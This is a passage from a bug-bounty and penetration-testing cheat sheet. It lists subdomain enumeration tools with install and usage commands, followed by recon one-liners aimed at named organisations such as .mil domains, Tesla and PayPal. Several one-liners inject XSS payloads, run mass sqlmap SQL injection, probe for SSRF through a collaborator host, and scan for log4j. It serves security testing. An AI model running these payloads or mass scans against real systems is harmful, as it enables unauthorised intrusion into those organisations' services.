Enumerate subdomains using CT logs (crt.sh) 
[[ PAGE 87 ]]
o 
https://github.com/UnaPibaGeek/ctfr 
• 
Installation 
• 
git clone https://github.com/UnaPibaGeek/ctfr.git 
• 
cd ctfr 
• 
pip3 install -r requirements.txt 
• 
Usage 
o 
cd ctfr; python3 ctfr.py -d target.com -o $outfile 
Dig 
• 
Description 
o 
Zone transfer, DNS lookups & reverse lookups 
• 
Installation 
o 
Installed by default in Kali, otherwise: 
o 
aptitude instal dnsutils 
• 
Usage dig +multi AXFR target.com dig +multi AXFR $ns_server target.com 
Domains-from-csp 
• 
Description 
o 
Extract domain names from Content Security Policy(CSP) headers 
o 
https://github.com/yamakira/domains-from-csp 
• 
Installation 
• 
git clone https://github.com/yamakira/domains-from-csp.git 
• 
pip install click 
• 
Usage 
o 
Parse CSP header for domains: cd domains-from-csp; python csp_parser.py 
$URL 
o 
Parse CSP header & resolve the domains: cd domains-from-csp; python 
csp_parser.py $URL -r 
Dnscan 
• 
Description 
o 
AXFR, brute force 
o 
https://github.com/rbsec/dnscan 
• 
Install 
• 
git clone https://github.com/rbsec/dnscan.git 
[[ PAGE 88 ]]
• 
cd dnscan 
• 
pip install -r requirements.txt 
• 
Usage 
o 
Subdomain brute-force of a domain: dnscan.py -d target.com -o outfile -w 
$wordlist 
o 
Subdomain brute-force of domains listed in a file (one by line): dnscan.py -l 
$domains_file -o outfile -w $wordlist 
o 
Other options: 
▪ 
-i $file: Output discovered IP addresses to a text file 
▪ 
-r: Recursively scan subdomains 
▪ 
-T: TLD expansion 
Dnsrecon 
• 
Description 
o 
DNS zone transfer, DNS cache snooping, TLD expansion, SRV enumeration, 
DNS records enumeration, brute-force, check for Wildcard resolution, 
subdomain scraping, PTR record lookup, check DNS server cached records, 
mDNS records enumeration… 
o 
https://github.com/darkoperator/dnsrecon 
• 
Installation 
o 
aptitude install dnsrecon on Kali, or: 
o 
git clone https://github.com/darkoperator/dnsrecon.git 
o 
cd dnsrecon 
o 
pip install -r requirements.txt 
• 
Usage 
o 
Brute-force: dnsrecon -d target.com -D wordlist.txt -t brt 
o 
DNS cache snooping: dnsrecon -t snoop -D wordlist.txt -n 2.2.2.2 where 2.2.2.2 
is the IP of the target’s NS server 
o 
Options 
▪ 
--threads 8: Number of threads 
▪ 
-n nsserver.com: Use a custom name server 
▪ 
Output options 
▪ 
--db: SQLite 3 file 
▪ 
--xml: XML file 
[[ PAGE 89 ]]
▪ 
--json: JSON file 
▪ 
--csv: CSV file 
Dnssearch 
• 
Description 
o 
Subdomain brute-force 
o 
https://github.com/evilsocket/dnssearch 
• 
Installation 
• 
go get github.com/evilsocket/dnssearch 
o 
Add ~/go/bin/ to PATH by adding this line to ~/.profile: export 
PATH=$PATH:/home/mima/go/bin/ 
• 
Usage 
o 
dnssearch -domain target.com -wordlist $wordlist 
o 
Other options 
▪ 
-a bool: Lookup A records (default true) 
▪ 
-txt bool: Lookup TXT records (default false) 
▪ 
-cname bool: Show CNAME records (default false) 
▪ 
-consumers 10: Number of threads (default 8) 
Domained 
• 
Description 
o 
Wrapper for Sublist3r, Knock, Subbrute, Massdns, Recon-ng, Amass & 
SubFinder 
o 
https://github.com/cakinney/domained 
• 
Installation 
• 
git clone https://github.com/cakinney/domained.git 
• 
cd domained 
• 
pip install -r ./ext/requirements.txt 
• 
python domained.py --install 
• 
Usage 
o 
Run Sublist3r (+subbrute), enumall, Knock, Amass & SubFinder: python 
domained.py -d target.com 
o 
Run only Amass & Subfinder: python domained.py -d target.com --quick 
[[ PAGE 90 ]]
o 
Brute-force with massdns & subbrute with Seclist wordlist, plus Sublist3r, 
Amass, enumall & SubFinder: python domained.py -d target.com --b 
o 
Bruteforce with Jason Haddix’s All.txt wordlist, plus Sublist3r, Amass, enumall 
& SubFinder: python domained.py -d target.com -b --bruteall 
o 
Other options 
▪ 
--notify: Send Pushover or Gmail notifications 
▪ 
--noeyewitness: No Eyewitness 
▪ 
--fresh: Delete old data from output folder 
Fierce 
• 
Description 
o 
AXFR, brute force, reverse DNS 
o 
https://github.com/bbhunter/fierce-domain-scanner (original link not 
available anymore) 
• 
Installation 
o 
Installed by default on Kali 
• 
Usage fierce -dns target.com 
Gobuster 
• 
Description 
o 
todo 
o 
https://github.com/OJ/gobuster 
• 
Installation 
• 
git clone https://github.com/OJ/gobuster.git 
• 
cd gobuster/ 
• 
go get && go build 
• 
go install 
• 
Usage 
o 
gobuster -m dns -u target.com -w $wordlist 
o 
Other options: 
▪ 
-i: Show IP addresses 
▪ 
-t 50: Number of threads (default 10) 
Google 
• 
Search engine 
[[ PAGE 91 ]]
• 
Usage 
o 
Find subsomains: site:*.target.com 
o 
Find subdomains & exclude specific ones: site:*.target.com -
site:www.target.com -site:help.target.com 
Knock 
• 
Description 
o 
AXFR, virustotal, brute-force 
o 
https://github.com/guelfoweb/knock 
• 
Install 
• 
apt-get install python-dnspython 
• 
git clone https://github.com/guelfoweb/knock.git 
• 
cd knock 
• 
nano knockpy/config.json # <- set your virustotal API_KEY 
• 
python setup.py install 
• 
Usage 
o 
Use default wordlist: knockpy target.com 
o 
Use custom wordlist: knockpy target.com -w $wordlist 
o 
Resolve domain name & get response headers: knockpy -r 
target.com or knockpy -r $ip 
o 
Save scan output in CSV: knockpy -c target.com 
o 
Export full report in JSON: knockpy -j target.com 
Ldns-walk 
• 
Description 
o 
DNSSEC zone walking 
• 
Installation 
o 
aptitude install ldnsutils 
• 
Usage 
o 
Detect if DNSSEC NSEC or NSEC3 is used: 
▪ 
ldns-walk target.com 
▪ 
ldns-walk @nsserver.com target.com 
o 
If DNSSEC NSEC is enabled, you’ll get all the domains 
o 
If DNSSEC NSEC3 is enabled, use Nsec3walker 
[[ PAGE 92 ]]
Massdns 
• 
Description 
o 
DNS resolver 
o 
https://github.com/blechschmidt/massdns 
• 
Installation 
• 
git clone https://github.com/blechschmidt/massdns.git 
• 
cd massdns/ 
• 
make 
• 
Usage 
o 
Resolve domains: cd massdns; ./bin/massdns -r lists/resolvers.txt -t AAAA -w 
results.txt domains.txt -o S -w output.txt 
o 
Subdomain brute-force: ./scripts/subbrute.py wordlist.txt target.com | 
./bin/massdns -r lists/resolvers.txt -t A -o S -w output.txt 
o 
Get subdomains with CT logs parser & resolve them with 
Massdns: ./scripts/ct.py target.com | ./bin/massdns -r lists/resolvers.txt -t A -o 
S -w output.txt 
o 
Other options: 
▪ 
-s 5000: Number of concurrent lookups (default 10000) 
▪ 
-t A (default), -t AAAA, -t PTR…: Type of DNS records to retrieve 
▪ 
Output options 
▪ 
-o S -w output.txt: Save output as simple text 
▪ 
-o F: Save output as full text 
▪ 
-o J: Save output as ndjson 
Nsec3walker 
• 
Description 
o 
DNSSEC NSEC3 zone walking 
o 
https://dnscurve.org/nsec3walker.html 
• 
Installation 
• 
wget https://dnscurve.org/nsec3walker-20101223.tar.gz 
• 
tar -xzf nsec3walker-20101223.tar.gz 
• 
cd nsec3walker-20101223 
• 
make 
[[ PAGE 93 ]]
• 
Usage 
• 
./collect target.com > target.com.collect 
• 
./unhash  target.com.collect > target.com.unhash 
• 
cat target.com.unhash | grep "target" | wc -l 
• 
cat target.com.unhash | grep "target" | awk '{print $2;}' 
Rapid7 Forward DNS dataset (Project Sonar) 
• 
Description 
o 
Public dataset containing the responses to DNS requests for all forward DNS 
names known by Rapid7’s Project Sonar 
o 
https://opendata.rapid7.com/sonar.fdns_v2/ 
• 
Installation 
o 
aptitude install jq pigz 
• 
Usage 
• 
wget https://scans.io/data/rapid7/sonar.fdns_v2/20170417-fdns.json.gz 
• 
cat 20170417-fdns.json.gz | pigz -dc | grep ".target.org" | jq` 
San_subdomain_enum.py 
• 
Description 
o 
Extract subdomains listed in Subject Alternate Name(SAN) of SSL/TLS 
certificates 
o 
https://github.com/appsecco/the-art-of-subdomain-
enumeration/blob/master/san_subdomain_enum.py 
• 
Installation 
o 
git clone https://github.com/appsecco/the-art-of-subdomain-enumeration.git 
• 
Usage 
o 
cd python the-art-of-subdomain-enumeration; ./san_subdomain_enum.py 
target.com 
Second Order 
• 
Description 
o 
Second-order subdomain takeover scanner 
o 
Can also be leveraged as an HTML parser to enumerate subdomains 
o 
https://github.com/mhmdiaa/second-order 
• 
Installation 
[[ PAGE 94 ]]
o 
go get github.com/mhmdiaa/second-order 
• 
Usage 
o 
Create a new copy of the default config.json file: cp 
~/go/src/github.com/mhmdiaa/second-order/config.json 
~/go/src/github.com/mhmdiaa/second-order/config-subs-enum.json 
o 
And edit ` ~/go/src/github.com/mhmdiaa/second-order/config-subs-
enum.json to replace “LogCrawledURLs”: false with “LogCrawledURLs”: true` 
o 
second-order -base https://target.com -config config.json -output target.com 
o 
Look for new subdomains in the resulting folder (./target.com) 
Subbrute 
• 
Description 
o 
Brute-force 
o 
https://github.com/TheRook/subbrute 
• 
Installation 
• 
aptitude install python-dnspython 
• 
git clone https://github.com/TheRook/subbrute.git 
• 
Usage 
o 
Test a single domain: ./subbrute.py target.com 
o 
Test multiple domains: ./subbrute.py target1.com target2.com 
o 
Test a list of domains: ./subbrute.py -t domains.txt 
o 
Enumerate subdomains, then their own subdomains: 
o 
./subbrute.py target.com > target.out 
o 
./subbrute.py -t target.out 
o 
Other options 
▪ 
-s wordlist.txt: Use a custom subdomains wordlist 
▪ 
-p: Print data from DNS records 
▪ 
-o outfile.txt: Save output in Greppable format 
▪ 
-j JSON: Save output to JSON file 
▪ 
-c 10: Number of threads (default 8) 
▪ 
-r resolvers.txt: Use a custom list of DNS resolvers 
Subfinder 
• 
Description 
[[ PAGE 95 ]]
o 
VirusTotal, PassiveTotal, SecurityTrails, Censys, Riddler, Shodan, Bruteforce 
o 
https://github.com/subfinder/subfinder 
• 
Installation: 
o 
go get github.com/subfinder/subfinder 
o 
Configure API keys: ./subfinder --set-config VirustotalAPIKey=0x41414141 
• 
Usage 
o 
Scraping: ./subfinder -d target.com -o $outfile 
o 
Scraping & brute-force: subfinder -b -d target.com -w $wordlist -o $outfile 
o 
Brute-force only: ./subfinder --no-passive -d target.com -b -w $wordlist -o 
$outfie 
o 
Other options: 
▪ 
-t 100: Number of threads (default 10) 
▪ 
-r 8.8.8.8,1.1.1.1 or -rL resolvers.txt: Use custom resolvers 
▪ 
-nW: Exclude wildcard subdomains 
▪ 
-recursive: Use recursion 
▪ 
-o $outfile -oJ: JSON output 
Sublist3r 
• 
Description 
o 
Baidu, Yahoo, Google, Bing, Ask, Netcraft, DNSdumpster, VirusTotal, Threat 
Crowd, SSL Certificates, PassiveDNS 
o 
https://github.com/aboul3la/Sublist3r 
• 
Installation 
• 
git clone https://github.com/aboul3la/Sublist3r.git 
• 
cd Sublist3r 
• 
pip install -r requirements.txt 
• 
Usage 
o 
Scraping: ./sublist3r.py -d target.com -o $outfile 
o 
Bruteforce: ./sublist3r.py -b -d target.com -o $outfile 
o 
Other options: 
▪ 
-p 80,443: Show only subdomains which have open ports 80 and 443 
Theharvester 
• 
Description 
[[ PAGE 96 ]]
o 
Tool for gathering subdomain names, e-mail addresses, virtual hosts, open 
ports/ banners, and employee names from different public sources 
o 
Scraping, Brute-force, Reverse DNS, TLD expansion 
o 
Scraping sources: Threatcrowd, Crtsh, Google, googleCSE, google-profiles, 
Bing, Bingapi, Dogpile, PGP, LinkedIn, vhost, Twitter, GooglePlus, Yahoo, Baidu, 
Shodan, Hunter 
o 
https://github.com/laramies/theHarvester 
• 
Installation 
o 
aptitude install theharvester 
• 
Usage 
o 
Scraping: theharvester -d target.com -b all 
o 
Other options: 
▪ 
-h output.html: Save output to HTML file 
▪ 
-f output.html: Save output to HTML & XML files 
▪ 
-t: Also do TLD expansion discovery 
▪ 
-c: Also do subdomain bruteforce 
▪ 
-n: Also do a DNS reverse query on all ranges discovered 
vhost-brute 
• 
Description 
o 
vhosts brute-force 
o 
https://github.com/gwen001/vhost-brute 
• 
Installation 
• 
aptitude install php-curl 
• 
git clone https://github.com/gwen001/vhost-brute.git 
• 
Usage 
o 
php vhost-brute.php --ip=$ip --domain=target.com --wordlist=$outfile 
o 
Other options: 
▪ 
--threads=5: Maximum threads (default 1) 
▪ 
--port: Set port 
▪ 
--ssl: Force SSL 
Virtual-host-discovery 
• 
Description 
[[ PAGE 97 ]]
o 
vhosts brute-force 
o 
https://github.com/jobertabma/virtual-host-discovery 
• 
Installation 
o 
git clone https://github.com/jobertabma/virtual-host-discovery.git 
• 
Usage 
o 
cd virtual-host-discover; ruby scan.rb --ip=1.1.1.1 --host=target.com --output 
output.txt 
o 
Other options 
▪ 
--ssl=on: Enable SSL 
▪ 
--port 8080: Use a custom port 
▪ 
--wordlist wordlist.txt: Use a custom wordlist 
Virustotal_subdomain_enum.py 
• 
Description 
o 
Query VirusTotal API for subdomains 
o 
DNS aggregator 
o 
https://github.com/appsecco/the-art-of-subdomain-
enumeration/blob/master/virustotal_subdomain_enum.py 
• 
Installation 
o 
git clone https://github.com/appsecco/the-art-of-subdomain-enumeration.git 
• 
Usage 
o 
python virustotal_subdomain_enum.py target.com 40 
Online tools 
Search engines 
• 
Baidu 
• 
Yahoo 
• 
Google 
• 
Bing 
• 
Yandex 
• 
Exalead 
• 
Dogpile 
Specialized search engines 
• 
ZoomEye 
[[ PAGE 98 ]]
• 
FOFA 
• 
Shodan 
• 
ThreatCrowd 
Certificate transparency 
• 
Crt.sh 
• 
Certspotter.com 
• 
Google Transaprency report 
• 
Facebook CT Monitoring 
• 
Certstream 
• 
CertDB 
• 
Censys.io 
Public datasets 
• 
Scans.io 
• 
Riddler 
• 
SecurityTrails 
• 
Common Crawl 
• 
PassiveTotal / RiskIQ Community API 
• 
DNSDB 
• 
Forward DNS dataset 
• 
WhoisXML API 
• 
PremiumDrops.com 
Online DNS tools & DNS aggregators 
• 
VirusTotal 
• 
Dnsdumpster 
• 
Cloudflare 
• 
Netcraft 
• 
FindSubdomains 
• 
viewdns.info 
• 
Site Dossier 
Git repositories 
• 
Github 
[[ PAGE 99 ]]
• 
Gitlab 
Wordlists 
• 
all.txt 
• 
commonspeak2-wordlists 
• 
SecLists lists 
Resources 
• 
PayloadsAllTheThings - Subdomains Enumeration.md 
• 
What tools I use for my recon during #BugBounty 
• 
Subdomain enumeration 
• 
A penetration tester’s guide to subdomain enumeration 
• 
Doing Subdomain Enumeration the right way 
• 
The Art of Subdomain Enumeration 
• 
Discovering Subdomains 
• 
Project Sonar: An Underrated Source of Internet-wide Data 
• 
The Art of Subdomain Enumeration 
https://pentester.land/cheatsheets/2018/11/14/subdomains-enumeration-cheatsheet.html 
Scripts that need to be installed 
To run the project, you will need to install the following programs: 
• 
Amass 
• 
Anew 
• 
Anti-burl 
• 
Assetfinder 
• 
Airixss 
• 
Axiom 
• 
Bhedak 
• 
CF-check 
• 
Chaos 
• 
Cariddi 
• 
Dalfox 
• 
DNSgen 
• 
Filter-resolved 
[[ PAGE 100 ]]
• 
Findomain 
• 
Fuff 
• 
Freq 
• 
Gargs 
• 
Gau 
• 
Gf 
• 
Github-Search 
• 
Gospider 
• 
Gowitness 
• 
Goop 
• 
GetJS 
• 
Hakrawler 
• 
HakrevDNS 
• 
Haktldextract 
• 
Haklistgen 
• 
Html-tool 
• 
Httpx 
• 
Jaeles 
• 
Jsubfinder 
• 
Kxss 
• 
LinkFinder 
• 
log4j-scan 
• 
Metabigor 
• 
MassDNS 
• 
Naabu 
• 
Notify 
• 
Qsreplace 
• 
Rush 
• 
SecretFinder 
• 
Shodan 
• 
ShuffleDNS 
[[ PAGE 101 ]]
• 
SQLMap 
• 
Subfinder 
• 
SubJS 
• 
Unew 
• 
Unfurl 
• 
WaybackURLs 
• 
Wingman 
• 
Goop 
• 
Tojson 
• 
X8 
• 
XSStrike 
• 
Page-fetch 
BBRF SCOPE DoD 
bbrf inscope add '*.af.mil' '*.osd.mil' '*.marines.mil' '*.pentagon.mil' '*.disa.mil' '*.health.mil' 
'*.dau.mil' '*.dtra.mil' '*.ng.mil' '*.dds.mil' '*.uscg.mil' '*.army.mil' '*.dcma.mil' '*.dla.mil' 
'*.dtic.mil' '*.yellowribbon.mil' '*.socom.mil' 
Scan log4j using BBRF and log4j-scan 
• 
Explained command 
bbrf domains | httpx -silent | xargs -I@ sh -c 'python3 http://log4j-scan.py -u "@"' 
Airixss XSS 
• 
Explained command 
echo testphp.vulnweb.com | waybackurls | gf xss | uro | httpx -silent | qsreplace '"><svg 
onload=confirm(1)>' | airixss -payload "confirm(1)" 
FREQ XSS 
• 
Explained command 
echo testphp.vulnweb.com | waybackurls | gf xss | uro | qsreplace '"><img src=x 
onerror=alert(1);>' | freq | egrep -v 'Not' 
Bhedak 
• 
Explained command 
cat urls | bhedak "\"><svg/onload=alert(1)>*'/---+{{7*7}}" 
.bashrc shortcut OFJAAAH 
reconjs(){ 
[[ PAGE 102 ]]
gau -subs $1 |grep -iE '\.js'|grep -iEv '(\.jsp|\.json)' >> js.txt ; cat js.txt | anti-burl | awk '{print 
$4}' | sort -u >> AliveJs.txt 
} 
cert(){ 
curl -s "[https://crt.sh/?q=%.$1&output=json](https://crt.sh/?q=%25.$1&output=json)" | jq -r 
'.[].name_value' | sed 's/\*\.//g' | anew 
} 
anubis(){ 
curl -s "[https://jldc.me/anubis/subdomains/$1](https://jldc.me/anubis/subdomains/$1)" | 
grep -Po "((http|https):\/\/)?(([\w.-]*)\.([\w]*)\.([A-z]))\w+" | anew 
} 
Oneliner Haklistgen 
• 
@hakluke 
subfinder -silent -d domain | anew subdomains.txt | httpx -silent | anew urls.txt | hakrawler | 
anew endpoints.txt | while read url; do curl $url --insecure | haklistgen | anew wordlist.txt; 
done 
cat subdomains.txt urls.txt endpoints.txt | haklistgen | anew wordlist.txt; 
Running JavaScript on each page send to proxy. 
• 
Explained command 
cat 200http | page-fetch --javascript '[...document.querySelectorAll("a")].map(n => n.href)' --
proxy http://192.168.15.47:8080 
Running cariddi to Crawler 
• 
Explained command 
echo tesla.com | subfinder -silent | httpx -silent | cariddi -intensive 
Dalfox scan to bugbounty targets. 
• 
Explained command 
xargs -a xss-urls.txt -I@ bash -c 'python3 /dir-to-xsstrike/xsstrike.py -u @ --fuzzer' 
Dalfox scan to bugbounty targets. 
• 
Explained command 
wget https://raw.githubusercontent.com/arkadiyt/bounty-targets-
data/master/data/domains.txt -nv ; cat domains.txt | anew | httpx -silent -threads 500 | xargs 
-I@ dalfox url @ 
Using x8 to Hidden parameters discovery 
• 
Explaining command 
[[ PAGE 103 ]]
assetfinder domain | httpx -silent | sed -s 's/$/\//' | xargs -I@ sh -c 'x8 -u @ -w params.txt -o 
enumerate' 
Extract .js Subdomains 
• 
Explaining command 
echo "domain" | haktrails subdomains | httpx -silent | getJS --complete | anew JS 
echo "domain" | haktrails subdomains | httpx -silent | getJS --complete | tojson | anew JS1 
goop to search .git files. 
• 
Explaining command 
xargs -a xss -P10 -I@ sh -c 'goop @' 
Using chaos list to enumerate endpoint 
curl -s https://raw.githubusercontent.com/projectdiscovery/public-bugbounty-
programs/master/chaos-bugbounty-list.json | jq -r '.programs[].domains[]' | xargs -I@ sh -c 
'python3 paramspider.py -d @' 
Using Wingman to search XSS reflect / DOM XSS 
• 
Explaining command 
xargs -a domain -I@ sh -c 'wingman -u @ --crawl | notify' 
Search ASN to metabigor and resolvers domain 
• 
Explaining command 
echo 'dod' | metabigor net --org -v | awk '{print $3}' | sed 's/[[0-9]]\+\.//g' | xargs -I@ sh -c 
'prips @ | hakrevdns | anew' 
OneLiners 
Search .json gospider filter anti-burl 
• 
Explaining command 
gospider -s https://twitch.tv --js | grep -E "\.js(?:onp?)?$" | awk '{print $4}' | tr -d "[]" | anew | 
anti-burl 
Search .json subdomain 
• 
Explaining command 
assetfinder http://tesla.com | waybackurls | grep -E "\.json(?:onp?)?$" | anew  
SonarDNS extract subdomains 
• 
Explaining command 
wget https://opendata.rapid7.com/sonar.fdns_v2/2021-02-26-1614298023-fdns_a.json.gz ; 
gunzip 2021-02-26-1614298023-fdns_a.json.gz ; cat 2021-02-26-1614298023-fdns_a.json | 
grep ".DOMAIN.com" | jq .name | tr '" " "' " / " | tee -a sonar 
Kxss to search param XSS 
[[ PAGE 104 ]]
• 
Explaining command 
echo http://testphp.vulnweb.com/ | waybackurls | kxss 
Recon subdomains and gau to search vuls DalFox 
• 
Explaining command 
assetfinder testphp.vulnweb.com | gau |  dalfox pipe 
Recon subdomains and Screenshot to URL using gowitness 
• 
Explaining command 
assetfinder -subs-only army.mil | httpx -silent -timeout 50 | xargs -I@ sh -c 'gowitness single 
@'  
Extract urls to source code comments 
• 
Explaining command 
cat urls1 | html-tool comments | grep -oE '\b(https?|http)://[-A-Za-z0-9+&@#/%?=~_|!:,.;]*[-
A-Za-z0-9+&@#/%=~_|]'  
Axiom recon "complete" 
• 
Explaining command 
findomain -t domain -q -u url ; axiom-scan url -m subfinder -o subs --threads 3 ; axiom-scan 
subs -m httpx -o http ; axiom-scan http -m ffuf --threads 15 -o ffuf-output ; cat ffuf-output | tr 
"," " " | awk '{print $2}' | fff | grep 200 | sort -u  
Domain subdomain extraction 
• 
Explaining command 
cat url | haktldextract -s -t 16 | tee subs.txt ; xargs -a subs.txt -I@ sh -c 'assetfinder -subs-only 
@ | anew | httpx -silent  -threads 100 | anew httpDomain' 
Search .js using 
• 
Explaining command 
assetfinder -subs-only DOMAIN -silent | httpx -timeout 3 -threads 300 --follow-redirects -silent 
| xargs -I% -P10 sh -c 'hakrawler -plain -linkfinder -depth 5 -url %' | awk '{print $3}' | grep -E 
"\.js(?:onp?)?$" | anew 
This one was huge ... But it collects .js gau + wayback + gospider and makes an analysis of 
the js. tools you need below. 
• 
Explaining command 
cat dominios | gau |grep -iE '\.js'|grep -iEv '(\.jsp|\.json)' >> gauJS.txt ; cat dominios | 
waybackurls | grep -iE '\.js'|grep -iEv '(\.jsp|\.json)' >> waybJS.txt ; gospider -a -S dominios -d 2 
| grep -Eo "(http|https)://[^/\"].*\.js+" | sed "s#\] \- #\n#g" >> gospiderJS.txt ; cat gauJS.txt 
waybJS.txt gospiderJS.txt | sort -u >> saidaJS ; rm -rf *.txt ; cat saidaJS | anti-burl |awk '{print 
$4}' | sort -u >> AliveJs.txt ; xargs -a AliveJs.txt -n 2 -I@ bash -c "echo -e '\n[URL]: @\n'; 
[[ PAGE 105 ]]
python3 linkfinder.py -i @ -o cli" ; cat AliveJs.txt  | python3 collector.py output ; rush -i 
output/urls.txt 'python3 SecretFinder.py -i {} -o cli | sort -u >> output/resultJSPASS' 
My recon automation simple. OFJAAAH.sh 
• 
Explaining command 
chaos -d $1 -o chaos1 -silent ; assetfinder -subs-only $1 >> assetfinder1 ; subfinder -d $1 -o 
subfinder1 -silent ; cat assetfinder1 subfinder1 chaos1 >> hosts ; cat hosts | anew 
clearDOMAIN ; httpx -l hosts -silent -threads 100 | anew http200 ; rm -rf chaos1 assetfinder1 
subfinder1 
Download all domains to bounty chaos 
• 
Explaining command 
curl https://chaos-data.projectdiscovery.io/index.json | jq -M '.[] | .URL | @sh' | xargs -I@ sh -
c 'wget @ -q'; mkdir bounty ; unzip '*.zip' -d bounty/ ; rm -rf *zip ; cat bounty/*.txt >> 
allbounty ; sort -u allbounty >> domainsBOUNTY ; rm -rf allbounty bounty/ ; echo '@OFJAAAH' 
Recon to search SSRF Test 
• 
Explaining command 
findomain -t DOMAIN -q | httpx -silent -threads 1000 | gau |  grep "=" | qsreplace 
http://YOUR.burpcollaborator.net 
ShuffleDNS to domains in file scan nuclei. 
• 
Explaining command 
xargs -a domain -I@ -P500 sh -c 'shuffledns -d "@" -silent -w words.txt -r resolvers.txt' | httpx -
silent -threads 1000 | nuclei -t /root/nuclei-templates/ -o re1 
Search Asn Amass 
• 
Explaining command 
Amass intel will search the organization "paypal" from a database of ASNs at a faster-than-
default rate. It will then take these ASN numbers and scan the complete ASN/IP space for all 
tld's in that IP space (paypal.com, paypal.co.id, paypal.me) 
amass intel -org paypal -max-dns-queries 2500 | awk -F, '{print $1}' ORS=',' | sed 's/,$//' | 
xargs -P3 -I@ -d ',' amass intel -asn @ -max-dns-queries 2500'' 
SQLINJECTION Mass domain file 
• 
Explaining command 
httpx -l domains -silent -threads 1000 | xargs -I@ sh -c 'findomain -t @ -q | httpx -silent | anew 
| waybackurls | gf sqli >> sqli ; sqlmap -m sqli --batch --random-agent --level 1' 
Using chaos search js 
• 
Explaining command 
Chaos is an API by Project Discovery that discovers subdomains. Here we are querying thier API 
for all known subdoains of "att.com". We are then using httpx to find which of those domains 
[[ PAGE 106 ]]
is live and hosts an HTTP or HTTPs site. We then pass those URLs to GoSpider to visit them and 
crawl them for all links (javascript, endpoints, etc). We then grep to find all the JS files. We 
pipe this all through anew so we see the output iterativlely (faster) and grep for 
"(http|https)://att.com" to make sure we dont recieve output for domains that are not 
"att.com". 
chaos -d att.com | httpx -silent | xargs -I@ -P20 sh -c 'gospider -a -s "@" -d 2' | grep -Eo 
"(http|https)://[^/"].*.js+" | sed "s#] 
Search Subdomain using Gospider 
• 
Explaining command 
GoSpider to visit them and crawl them for all links (javascript, endpoints, etc) we use some 
blacklist, so that it doesn’t travel, not to delay, grep is a command-line utility for searching 
plain-text data sets for lines that match a regular expression to search HTTP and HTTPS 
gospider -d 0 -s "https://site.com" -c 5 -t 100 -d 5 --blacklist 
jpg,jpeg,gif,css,tif,tiff,png,ttf,woff,woff2,ico,pdf,svg,txt | grep -Eo '(http|https)://[^/"]+' | anew 
Using gospider to chaos 
• 
Explaining command 
GoSpider to visit them and crawl them for all links (javascript, endpoints, etc) chaos is a 
subdomain search project, to use it needs the api, to xargs is a command on Unix and most 
Unix-like operating systems used to build and execute commands from standard input. 
chaos -d paypal.com -bbq -filter-wildcard -http-url | xargs -I@ -P5 sh -c 'gospider -a -s "@" -d 3' 
Using recon.dev and gospider crawler subdomains 
• 
Explaining command 
We will use recon.dev api to extract ready subdomains infos, then parsing output json with jq, 
replacing with a Stream EDitor all blank spaces If anew, we can sort and display unique 
domains on screen, redirecting this output list to httpx to create a new list with just alive 
domains. Xargs is being used to deal with gospider with 3 parallel proccess and then using grep 
within regexp just taking http urls. 
curl "https://recon.dev/api/search?key=apiKEY&domain=paypal.com" |jq -r '.[].rawDomains[]' 
| sed 's/ //g' | anew |httpx -silent | xargs -P3 -I@ gospider -d 0 -s @ -c 5 -t 100 -d 5 --blacklist 
jpg,jpeg,gif,css,tif,tiff,png,ttf,woff,woff2,ico,pdf,svg,txt | grep -Eo '(http|https)://[^/"]+' | anew 
PSQL - search subdomain using cert.sh 
• 
Explaining command 
Make use of pgsql cli of crt.sh, replace all comma to new lines and grep just twitch text 
domains with anew to confirm unique outputs 
psql -A -F , -f querycrt -h http://crt.sh -p 5432 -U guest certwatch 2>/dev/null | tr ', ' '\n' | grep 
twitch | anew 
Search subdomains using github and httpx 
[[ PAGE 107 ]]
• 
Github-search 
Using python3 to search subdomains, httpx filter hosts by up status-code response (200) 
./github-subdomains.py -t APYKEYGITHUB -d domaintosearch | httpx --title 
Search SQLINJECTION using qsreplace search syntax error 
• 
Explained command 
grep "="  .txt| qsreplace "' OR '1" | httpx -silent -store-response-dir output -threads 100 | grep 
-q -rn "syntax\|mysql" output 2>/dev/null && \printf "TARGET \033[0;32mCould Be 
Exploitable\e[m\n" || printf "TARGET \033[0;31mNot Vulnerable\e[m\n" 
Search subdomains using jldc 
• 
Explained command 
curl -s "https://jldc.me/anubis/subdomains/att.com" | grep -Po "((http|https):\/\/)?(([\w.-
]*)\.([\w]*)\.([A-z]))\w+" | anew 
Search subdomains in assetfinder using hakrawler spider to search links in content responses 
• 
Explained command 
assetfinder -subs-only tesla.com -silent | httpx -timeout 3 -threads 300 --follow-redirects -
silent | xargs -I% -P10 sh -c 'hakrawler -plain -linkfinder -depth 5 -url %' | grep "tesla" 
Search subdomains in cert.sh 
• 
Explained command 
curl -s "https://crt.sh/?q=%25.att.com&output=json" | jq -r '.[].name_value' | sed 's/\*\.//g' | 
httpx -title -silent | anew 
Search subdomains in cert.sh assetfinder to search in link /.git/HEAD 
• 
Explained command 
curl -s "https://crt.sh/?q=%25.tesla.com&output=json" | jq -r '.[].name_value' | assetfinder -
subs-only | sed 's#$#/.git/HEAD#g' | httpx -silent -content-length -status-code 301,302 -
timeout 3 -retries 0 -ports 80,8080,443 -threads 500 -title | anew 
curl -s "https://crt.sh/?q=%25.enjoei.com.br&output=json" | jq -r '.[].name_value' | 
assetfinder -subs-only | httpx -silent -path /.git/HEAD -content-length -status-code 301,302 -
timeout 3 -retries 0 -ports 80,8080,443 -threads 500 -title | anew 
Collect js files from hosts up by gospider 
• 
Explained command 
xargs -P 500 -a pay -I@ sh -c 'nc -w1 -z -v @ 443 2>/dev/null && echo @' | xargs -I@ -P10 sh -c 
'gospider -a -s "https://@" -d 2 | grep -Eo "(http|https)://[^/\"].*\.js+" | sed "s#\] \- #\n#g" | 
anew' 
Subdomain search Bufferover resolving domain to httpx 
• 
Explained command 
[[ PAGE 108 ]]
curl -s https://dns.bufferover.run/dns?q=.sony.com |jq -r .FDNS_A[] | sed -s 's/,/\n/g' | httpx -
silent | anew 
Using gargs to gospider search with parallel proccess 
• 
Gargs 
• 
Explained command 
httpx -ports 80,443,8009,8080,8081,8090,8180,8443 -l domain -timeout 5 -threads 200 --
follow-redirects -silent | gargs -p 3 'gospider -m 5 --blacklist pdf -t 2 -c 300 -d 5 -a -s {}' | anew 
stepOne 
Injection xss using qsreplace to urls filter to gospider 
• 
Explained command 
gospider -S domain.txt -t 3 -c 100 |  tr " " "\n" | grep -v ".js" | grep "https://" | grep "=" | 
qsreplace '%22><svg%20onload=confirm(1);>' 
Extract URL's to apk 
• 
Explained command 
